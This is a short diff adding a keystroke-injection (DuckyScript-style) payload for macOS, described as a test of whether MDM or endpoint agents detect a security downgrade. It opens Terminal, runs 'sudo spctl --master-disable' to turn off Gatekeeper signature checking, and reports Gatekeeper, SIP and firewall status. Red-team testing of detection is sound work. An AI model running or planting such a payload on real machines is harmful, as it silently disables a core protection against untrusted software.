@@ -1,0 +1,23 @@
+REM ============================================================
+REM  macOS · Disable Gatekeeper + SIP Check
+REM ============================================================
+REM  Disables Gatekeeper (app signature verification) and
+REM  checks SIP status. Tests whether MDM or endpoint agents
+REM  detect security downgrade.
+REM
+REM  Requires admin password (sudo will prompt).
+
+DEFAULTDELAY 80
+
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 400
+ENTER
+DELAY 1500
+STRINGLN sudo spctl --master-disable
+DELAY 2000
+STRINGLN echo "=== Gatekeeper ===" && spctl --status
+STRINGLN echo "=== SIP ===" && csrutil status
+STRINGLN echo "=== Firewall ===" && /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
+STRINGLN exit
